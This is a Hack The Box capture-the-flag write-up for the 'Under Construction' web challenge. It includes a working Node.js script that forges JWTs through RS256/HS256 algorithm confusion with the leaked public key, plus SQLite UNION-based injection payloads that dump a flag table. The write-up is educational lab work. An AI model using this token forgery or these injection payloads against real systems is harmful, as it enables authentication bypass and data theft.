# Hack The Box -  Under Construction [write-up]

Today we are gonna see how I solved makelarisjr's challenge on Hack The Box.

## What we see

Visiting the page we are greeted by a simple login/register portal.
Viewing the page source gives us no clues, so we turn our focus at the login/register function.

## Attempts at sqli

Trying to login with any username/password combo, greets us with an 
>Invalid username or password 

message, so we head on registering a new account.

After creating a new account and login in with the new credentials, we are greeted by a welcoming message that mentions our username. That gives us the idea of a possible sqli. So we start with the common login page exploits but none of them work, but we notice something interesting going on. After creating an account with a username that includes double quotes **"**, we can't login with that username but it throws us an error:
>user username"" doesn't exist in our database.

The double quotes got duplicated! It probably searches for the user ' username"" ', in the db, and can't find it. We confirm our suspicions by registering a new account ' username"" ' and now logging in with the username ' username" ', it works! There is some input sanitization going on. I put some time there but was not able to bypass it, every time I used double quotes, they were duplicated, making it impossible to inject some sql code.

We have to look somewhere else.

## Another approach

Taking a look at the cookies, we find a *session* cookie.
It's a long string that is seperated by 2 dots. This makes us think it's a **[JWT](https://jwt.io/introduction/)** whose format is **xxxxx.yyyyy.zzzzz**.
Having logged in with the username *hax0r* and parsing it gives us back
```
HEADER:
{
  "alg": "RS256",
  "typ": "JWT"
}
PAYLOAD:
{
  "username": "username",
  "pk": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n",
  "iat": 1585403996
}
```

So our assumptions were true, but what do we know now?

-The site uses a cookie to store the current username.
-It can be verified if it has been manipulated using RS256 encryption.
-We are provided with a public key.

Taking a look at the supplied files we come accross this interesting *JWTHelper* file:
```
const fs = require('fs');
const jwt = require('jsonwebtoken');

const privateKey = fs.readFileSync('./private.key', 'utf8');
const publicKey  = fs.readFileSync('./public.key', 'utf8');

module.exports = {
    async sign(data) {
        data = Object.assign(data, {pk:publicKey});
        return (await jwt.sign(data, privateKey, { algorithm:'RS256' }))
    },
    async decode(token) {
        return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
    }
}
```

We can see that there is a private.key, a *public.key*. Some "data" (our username) + the publicKey are signed using RS256 ecryption and the privateKey, but can be veryfied using either RS256 or **HS256** encryption using the publicKey that we know, hmmm something smells fishy right here.

## Diffrences between RS256 and HS256
- RS256 encryption is assymetric, meaning that we use two keys, one public and one secret, to sign our data
- HS256 encryption uses the same key to sign and verify the data.

But wait! We already know the key used to verify the signature, and the app has the option to decode using the HS256 encryption. That means that we can create a our own payload, generate the cookie, encrypt it with the known public Key, and win! And that's what we did.

## Exploiting 

Using this nodejs script:
```
const jwt = require('jsonwebtoken');

payload = "hax0r"

data = {username : payload};

publicKey = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n"

data = Object.assign(data, {pk : publicKey})

exploit = jwt.sign(data, publicKey, { algorithm:'HS256'})

console.log(exploit)
```

we can generate a cookie with any *username* parameter we want. The above example, signs us with the created account.
What if we try to sign in with a random username?

The site returns: 
>user random_username doesn't exist in our database.

So using the name we can attempt to login with any name, and guess what! **Quotes ' are now freely allowed**, so we can give another go at *sqli*.

Attempting to login with the usual payload "*' or 1 --* " signs us in with the username "user". Gotcha!

Next, we find the ammount of columns we need to return but trial and error using the payload "*' and 0 UNION SELECT 1,2,... --* " until no "SQLITE_ERROR" pops up . The magic number is **3**. We just signed in with the username *2*. So we have 3 columns and we can read the second collumn. Using the payload "*' and 0 UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type ='table' --* " we login in with the username "***flag_storage***". After that, obtaining the flag is very trivial using the payload "*' and 0 UNION SELECT \*,NULL FROM flag_storage --* "

## Pack it up boys!

That was it! It was an interesting challenge that made me learned a lot. I hopped you like it too!
